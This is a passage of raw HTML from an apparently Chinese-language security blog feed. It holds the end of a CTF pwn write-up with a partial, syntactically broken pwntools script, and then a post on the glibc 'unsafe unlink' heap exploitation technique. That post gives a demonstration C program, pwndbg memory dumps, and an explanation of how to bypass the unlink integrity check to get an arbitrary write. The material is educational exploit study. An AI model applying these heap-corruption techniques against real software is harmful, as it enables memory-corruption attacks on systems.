class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">'/home/xfgg/pwn'</span>)</span><br><span class="line">elf = ELF(<span class="string">'/home/xfgg/pwn'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create_string</span><span class="params">(size,string)</span></span></span><br><span class="line"><span class="function"><span class="title">p</span>.<span class="title">recvuntil</span><span class="params">(<span class="string">" "</span>)</span></span></span><br><span class="line"><span class="function">    <span class="title">p</span>.<span class="title">sendline</span><span class="params">(<span class="string">"1"</span>)</span></span></span><br><span class="line"><span class="function"><span class="title">p</span>.<span class="title">recvuntil</span>（' <span class="title">of</span> <span class="title">string</span>：'）</span></span><br><span class="line"><span class="function"><span class="title">p</span>.<span class="title">sendline</span>（<span class="title">str</span><span class="params">(size)</span>）</span></span><br><span class="line"><span class="function"><span class="title">p</span>.<span class="title">recvuntil</span>（' <span class="title">the</span> <span class="title">string</span>：'）</span></span><br><span class="line"><span class="function"><span class="title">p</span>.<span class="title">sendline</span> <span class="params">(string)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">def</span> <span class="title">display_string</span><span class="params">(index)</span></span></span><br><span class="line"><span class="function"><span class="title">p</span>.<span class="title">recvuntil</span><span class="params">(<span class="string">" "</span>)</span></span></span><br><span class="line"><span class="function">    <span class="title">p</span>.<span class="title">sendline</span><span class="params">(<span class="string">"2"</span>)</span></span></span><br><span class="line"><span class="function"><span class="title">p</span>.<span class="title">recvuntil</span>（' <span class="title">index</span>：'）</span></span><br><span class="line"><span class="function"><span class="title">p</span>.<span class="title">sendline</span><span class="params">(str<span class="params">(index)</span>)</span></span></span><br><span class="line"><span class="function">    </span></span><br><span class="line"><span class="function"><span class="title">def</span> <span class="title">delete_string</span><span class="params">(index)</span></span></span><br><span class="line"><span class="function"><span class="title">p</span>.<span class="title">recvuntil</span><span class="params">(<span class="string">" "</span>)</span></span></span><br><span class="line"><span class="function">    <span class="title">p</span>.<span class="title">sendline</span><span class="params">(<span class="string">"3"</span>)</span></span></span><br><span class="line"><span class="function"><span class="title">p</span>.<span class="title">recvuntil</span>（' <span class="title">index</span>：'）</span></span><br><span class="line"><span class="function"><span class="title">p</span>.<span class="title">sendline</span><span class="params">(str<span class="params">(index)</span>)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">create_string</span><span class="params">(<span class="number">32</span>,<span class="string">'aaa'</span>)</span></span></span><br><span class="line"><span class="function"><span class="title">create_string</span><span class="params">(<span class="number">32</span>,<span class="string">'bbb'</span>)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">delete</span><span class="params">(<span class="number">1</span>)</span></span></span><br><span class="line"><span class="function"><span class="title">delete</span><span class="params">(<span class="number">0</span>)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">magic</span></span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;0x01-寻找漏洞&quot;&gt;&lt;a href=&quot;#0x01-寻找漏洞&quot; class=&quot;headerlink&quot; title=&quot;0x01 寻找漏洞&quot;&gt;&lt;/a&gt;0x01 寻找漏洞&lt;/h3&gt;&lt;figure class=&quot;highlight python&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;
      
    
    </summary>
    
      <category term="网络信息安全专项赛" scheme="http://yoursite.com/categories/%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E4%B8%93%E9%A1%B9%E8%B5%9B/"/>
    
    
      <category term="pwn" scheme="http://yoursite.com/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>unsafe unlink</title>
    <link href="http://yoursite.com/2019/08/12/unsafe%20unlink/"/>
    <id>http://yoursite.com/2019/08/12/unsafe unlink/</id>
    <published>2019-08-12T08:53:00.385Z</published>
    <updated>2019-08-12T12:38:45.390Z</updated>
    
    <content type="html"><![CDATA[<p>unlink</p><p>利用损坏的块自由地获取任意写入。</p><p>利用free改写全局指针chunk0_ptr达到任意内存写的目的，即不安全取消链接。</p><h3 id="0x01源代码"><a href="#0x01源代码" class="headerlink" title="0x01源代码"></a>0x01源代码</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="keyword">uint64_t</span> *chunk0_ptr;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Welcome to unsafe unlink 2.0!\n"</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Tested in Ubuntu 14.04/16.04 64bit.\n"</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"This technique only works with disabled tcache-option for glibc, see build_glibc.sh for build instructions.\n"</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"This technique can be used when you have a pointer at a known location to a region you can call unlink on.\n"</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"The most common scenario is a vulnerable buffer that can be overflown and has a global pointer.\n"</span>);</span><br><span class="line"><span class="keyword">int</span> malloc_size = <span class="number">0x80</span>; <span class="comment">//we want to be big enough not to use fastbins</span></span><br><span class="line"><span class="keyword">int</span> header_size = <span class="number">2</span>;</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"The point of this exercise is to use free to corrupt the global chunk0_ptr to achieve arbitrary memory write.\n\n"</span>);</span><br><span class="line">chunk0_ptr = (<span class="keyword">uint64_t</span>*) <span class="built_in">malloc</span>(malloc_size); <span class="comment">//chunk0</span></span><br><span class="line"><span class="keyword">uint64_t</span> *chunk1_ptr = (<span class="keyword">uint64_t</span>*) <span class="built_in">malloc</span>(malloc_size); <span class="comment">//chunk1</span></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"The global chunk0_ptr is at %p, pointing to %p\n"</span>, &amp;chunk0_ptr, chunk0_ptr);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"The victim chunk we are going to corrupt is at %p\n\n"</span>, chunk1_ptr);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"We create a fake chunk inside chunk0.\n"</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"We setup the 'next_free_chunk' (fd) of our fake chunk to point near to &amp;chunk0_ptr so that P-&gt;fd-&gt;bk = P.\n"</span>);</span><br><span class="line">chunk0_ptr[<span class="number">2</span>] = (<span class="keyword">uint64_t</span>) &amp;chunk0_ptr-(<span class="keyword">sizeof</span>(<span class="keyword">uint64_t</span>)*<span class="number">3</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"We setup the 'previous_free_chunk' (bk) of our fake chunk to point near to &amp;chunk0_ptr so that P-&gt;bk-&gt;fd = P.\n"</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"With this setup we can pass this check: (P-&gt;fd-&gt;bk != P || P-&gt;bk-&gt;fd != P) == False\n"</span>);</span><br><span class="line">chunk0_ptr[<span class="number">3</span>] = (<span class="keyword">uint64_t</span>) &amp;chunk0_ptr-(<span class="keyword">sizeof</span>(<span class="keyword">uint64_t</span>)*<span class="number">2</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Fake chunk fd: %p\n"</span>,(<span class="keyword">void</span>*) chunk0_ptr[<span class="number">2</span>]);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Fake chunk bk: %p\n\n"</span>,(<span class="keyword">void</span>*) chunk0_ptr[<span class="number">3</span>]);</span><br><span class="line"><span class="comment">//fprintf(stderr, "We need to make sure the 'size' of our fake chunk matches the 'previous_size' of the next chunk (chunk+size)\n");</span></span><br><span class="line"><span class="comment">//fprintf(stderr, "With this setup we can pass this check: (chunksize(P) != prev_size (next_chunk(P)) == False\n");</span></span><br><span class="line"><span class="comment">//fprintf(stderr, "P = chunk0_ptr, next_chunk(P) == (mchunkptr) (((char *) (p)) + chunksize (p)) == chunk0_ptr + (chunk0_ptr[1]&amp;(~ 0x7))\n");</span></span><br><span class="line"><span class="comment">//fprintf(stderr, "If x = chunk0_ptr[1] &amp; (~ 0x7), that is x = *(chunk0_ptr + x).\n");</span></span><br><span class="line"><span class="comment">//fprintf(stderr, "We just need to set the *(chunk0_ptr + x) = x, so we can pass the check\n");</span></span><br><span class="line"><span class="comment">//fprintf(stderr, "1.Now the x = chunk0_ptr[1]&amp;(~0x7) = 0, we should set the *(chunk0_ptr + 0) = 0, in other words we should do nothing\n");</span></span><br><span class="line"><span class="comment">//fprintf(stderr, "2.Further more we set chunk0_ptr = 0x8 in 64-bits environment, then *(chunk0_ptr + 0x8) == chunk0_ptr[1], it's fine to pass\n");</span></span><br><span class="line"><span class="comment">//fprintf(stderr, "3.Finally we can also set chunk0_ptr[1] = x in 64-bits env, and set *(chunk0_ptr+x)=x,for example chunk_ptr0[1] = 0x20, chunk_ptr0[4] = 0x20\n");</span></span><br><span class="line"><span class="comment">//chunk0_ptr[1] = sizeof(size_t);</span></span><br><span class="line"><span class="comment">//fprintf(stderr, "In this case we set the 'size' of our fake chunk so that chunk0_ptr + size (%p) == chunk0_ptr-&gt;size (%p)\n", ((char *)chunk0_ptr + chunk0_ptr[1]), &amp;chunk0_ptr[1]);</span></span><br><span class="line"><span class="comment">//fprintf(stderr, "You can find the commitdiff of this check at https://sourceware.org/git/?p=glibc.git;a=commitdiff;h=17f487b7afa7cd6c316040f3e6c86dc96b2eec30\n\n");</span></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"We assume that we have an overflow in chunk0 so that we can freely change chunk1 metadata.\n"</span>);</span><br><span class="line"><span class="keyword">uint64_t</span> *chunk1_hdr = chunk1_ptr - header_size;</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"We shrink the size of chunk0 (saved as 'previous_size' in chunk1) so that free will think that chunk0 starts where we placed our fake chunk.\n"</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"It's important that our fake chunk begins exactly where the known pointer points and that we shrink the chunk accordingly\n"</span>);</span><br><span class="line">chunk1_hdr[<span class="number">0</span>] = malloc_size;</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"If we had 'normally' freed chunk0, chunk1.previous_size would have been 0x90, however this is its new value: %p\n"</span>,(<span class="keyword">void</span>*)chunk1_hdr[<span class="number">0</span>]);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"We mark our fake chunk as free by setting 'previous_in_use' of chunk1 as False.\n\n"</span>);</span><br><span class="line">chunk1_hdr[<span class="number">1</span>] &amp;= ~<span class="number">1</span>;</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Now we free chunk1 so that consolidate backward will unlink our fake chunk, overwriting chunk0_ptr.\n"</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"You can find the source of the unlink macro at https://sourceware.org/git/?p=glibc.git;a=blob;f=malloc/malloc.c;h=ef04360b918bceca424482c6db03cc5ec90c3e00;hb=07c18a008c2ed8f5660adba2b778671db159a141#l1344\n\n"</span>);</span><br><span class="line"><span class="built_in">free</span>(chunk1_ptr);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"At this point we can use chunk0_ptr to overwrite itself to point to an arbitrary location.\n"</span>);</span><br><span class="line"><span class="keyword">char</span> victim_string[<span class="number">8</span>];</span><br><span class="line"><span class="built_in">strcpy</span>(victim_string,<span class="string">"Hello!~"</span>);</span><br><span class="line">chunk0_ptr[<span class="number">3</span>] = (<span class="keyword">uint64_t</span>) victim_string;</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"chunk0_ptr is now pointing where we want, we use it to overwrite our victim string.\n"</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Original value: %s\n"</span>,victim_string);</span><br><span class="line">chunk0_ptr[<span class="number">0</span>] = <span class="number">0x4141414142424242</span>LL;</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"New Value: %s\n"</span>,victim_string);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="0x02代码分析"><a href="#0x02代码分析" class="headerlink" title="0x02代码分析"></a>0x02代码分析</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br></pre></td><td class="code"><pre><span class="line">首先我们创建两个chunk 分别为chunk_0 和chunk_1</span><br><span class="line"></span><br><span class="line">Pwndbg&gt; x/<span class="number">40</span>gx <span class="number">0x603000</span><span class="number">-0x10</span></span><br><span class="line"><span class="number">0x602ff0</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x603000</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000091</span>            &lt;- chunk <span class="number">0</span></span><br><span class="line"><span class="number">0x603020</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x603030</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x603040</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x603050</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x603060</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x603070</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x603080</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x603090</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000091</span>            &lt;- chunk <span class="number">1</span></span><br><span class="line"><span class="number">0x6030a0</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x6030b0</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x6030c0</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x6030d0</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x6030e0</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x6030f0</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x603100</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x603110</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x603120</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000020ee1</span></span><br><span class="line">紧接着我们假设这个时候我们有堆溢出，可以对chunk 0 进行修改，我们伪造个chunk。由于有P-&gt;fd-&gt;bk != P || P-&gt;bk-&gt;fd != P) 这样的检查。我们可以利用全局指针 chunk0_ptr构造 fake chunk 来绕过它：</span><br><span class="line"></span><br><span class="line">我们伪造 fake chunk 的fd 为 chunk0_ptr[<span class="number">2</span>] = (uint64_t) &amp;chunk0_ptr-(sizeof(uint64_t)*<span class="number">3</span>);</span><br><span class="line"></span><br><span class="line">我们伪造 fake chunk 的bk 为chunk0_ptr[<span class="number">3</span>] = (uint64_t) &amp;chunk0_ptr-(sizeof(uint64_t)*<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">这个时候</span><br><span class="line"></span><br><span class="line">Pwndbg&gt; x/<span class="number">40</span>gx <span class="number">0x603000</span><span class="number">-0x10</span></span><br><span class="line"><span class="number">0x602ff0</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x603000</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000091</span>   &lt;-- chunk <span class="number">0</span></span><br><span class="line"><span class="number">0x603010</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span>   &lt;-- fake chunk</span><br><span class="line"><span class="number">0x603020</span>:   <span class="number">0x0000000000602058</span>  <span class="number">0x0000000000602060</span>        fd ,bk</span><br><span class="line"><span class="number">0x603030</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x603040</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x603050</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x603060</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x603070</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x603080</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x603090</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000091</span>    &lt;-- chunk <span class="number">1</span> &lt;-- prev_size</span><br><span class="line"><span class="number">0x6030a0</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x6030b0</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x6030c0</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x6030d0</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x6030e0</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x6030f0</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x603100</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x603110</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x603120</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000020ee1</span></span><br><span class="line">Pwndbg&gt; x/<span class="number">5</span>gx <span class="number">0x0000000000602058</span></span><br><span class="line"><span class="number">0x602058</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x00007ffff7dd2520</span>               &lt;-- fake chunk FD</span><br><span class="line"><span class="number">0x602068</span> &lt;completed<span class="number">.7557</span>&gt;:  <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000603010</span> &lt;-- bk pointer</span><br><span class="line"><span class="number">0x602078</span>:   <span class="number">0x0000000000000000</span></span><br><span class="line">Pwndbg&gt; x/<span class="number">5</span>gx <span class="number">0x0000000000602060</span></span><br><span class="line"><span class="number">0x602060</span> &lt;stderr@@GLIBC_2<span class="number">.2</span><span class="number">.5</span>&gt;: <span class="number">0x00007ffff7dd2520</span>  <span class="number">0x0000000000000000</span> &lt;-- fake chunk BK</span><br><span class="line"><span class="number">0x602070</span> &lt;chunk0_ptr&gt;:  <span class="number">0x0000000000603010</span>  <span class="number">0x0000000000000000</span>  &lt;-- fd pointer</span><br><span class="line"><span class="number">0x602080</span>:   <span class="number">0x0000000000000000</span></span><br><span class="line">Pwndbg&gt; heap</span><br><span class="line">这样就就会变成我 fake chunk 的 FD 块的bk指向 fake chunk， fake chunk 的BK 块 的fd指向fake chunk ，这样就能绕过检查。</span><br><span class="line"></span><br><span class="line">另外利用 chunk0 的溢出漏洞，通过修改 chunk <span class="number">1</span> 的 prev_size 为 fake chunk 的大小，修改 PREV_INUSE 标志位为 <span class="number">0</span>，将 fake chunk 伪造成一个 free chunk。</span><br><span class="line"></span><br><span class="line">libc 使用 size 域的最低 <span class="number">3</span> 位来 存储一些其它信息。相关的掩码信息定义如下:</span><br><span class="line"></span><br><span class="line"><span class="comment">#define PREV_INUSE 0x1</span></span><br><span class="line"><span class="comment">#define IS_MMAPPED 0x2 </span></span><br><span class="line"><span class="comment">#define NON_MAIN_ARENA 0x4</span></span><br><span class="line">从以上代码定义可以推断, size域的最低位表示 此块的上一块(表示连续内存中的上一块)是否在使 用状态, 如果此位为 <span class="number">0</span> 则表示上一块为被释放的块, 这个时候此块的 PREV_SIZE 域保存的是上一块的地 址以便在 free 此块时能够找到上一块的地址并进行 合并操作。第 <span class="number">2</span> 位表示此块是否由 mmap 分配, 如果 此位为 <span class="number">0</span> 则此块是由 top chunk 分裂得来, 否则是由 mmap 单独分配而来。第 <span class="number">3</span> 位表示此块是否不属于 main_arena</span><br><span class="line"></span><br><span class="line">Pwndbg&gt; x/<span class="number">40</span>gx <span class="number">0x603000</span><span class="number">-0x10</span></span><br><span class="line"><span class="number">0x602ff0</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x603000</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000091</span></span><br><span class="line"><span class="number">0x603010</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x603020</span>:   <span class="number">0x0000000000602058</span>  <span class="number">0x0000000000602060</span></span><br><span class="line"><span class="number">0x603030</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x603040</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x603050</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x603060</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x603070</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x603080</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x603090</span>:   <span class="number">0x0000000000000080</span>  <span class="number">0x0000000000000090</span></span><br><span class="line"><span class="number">0x6030a0</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x6030b0</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x6030c0</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x6030d0</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x6030e0</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x6030f0</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span 